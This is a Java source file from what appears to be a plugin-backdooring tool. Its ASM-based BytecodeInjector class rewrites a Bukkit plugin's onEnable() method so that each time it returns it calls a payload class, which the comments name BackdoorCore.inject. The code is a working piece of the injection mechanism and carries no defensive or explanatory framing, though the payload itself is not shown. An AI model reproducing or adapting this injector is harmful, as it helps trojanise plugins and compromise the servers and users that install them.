package dev.naruto.astrox.core;

import org.objectweb.asm.*;
import org.objectweb.asm.commons.AdviceAdapter;
import java.io.*;

/**
 * Low-level bytecode manipulation using ASM
 */
public class BytecodeInjector {
    private final String mainClassName;
    private final String payloadClassName;

    public BytecodeInjector(String mainClassName, String payloadClassName) {
        this.mainClassName = mainClassName;
        this.payloadClassName = payloadClassName;
    }

    /**
     * Inject call to BackdoorCore.inject(this) at end of onEnable()
     */
    public byte[] injectIntoClass(byte[] classBytes) throws IOException {
        ClassReader reader = new ClassReader(classBytes);
        ClassWriter writer = new ClassWriter(reader, ClassWriter.COMPUTE_MAXS);

        ClassVisitor visitor = new ClassVisitor(Opcodes.ASM9, writer) {
            @Override
            public MethodVisitor visitMethod(int access, String name,
                                             String descriptor, String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);

                // Hook into onEnable() method
                if (name.equals("onEnable") && descriptor.equals("()V")) {
                    return new AdviceAdapter(Opcodes.ASM9, mv, access, name, descriptor) {
                        @Override
                        protected void onMethodExit(int opcode) {
                            if (opcode == RETURN) {
                                // Inject: BackdoorCore.inject(this);
                                mv.visitVarInsn(ALOAD, 0); // Load 'this'
                                mv.visitMethodInsn(INVOKESTATIC,
                                        payloadClassName.replace('.', '/'),
                                        "inject",
                                        "(Lorg/bukkit/plugin/java/JavaPlugin;)V",
                                        false);
                            }
                            super.onMethodExit(opcode);
                        }
                    };
                }
                return mv;
            }
        };

        reader.accept(visitor, ClassReader.EXPAND_FRAMES);
        return writer.toByteArray();
    }
}
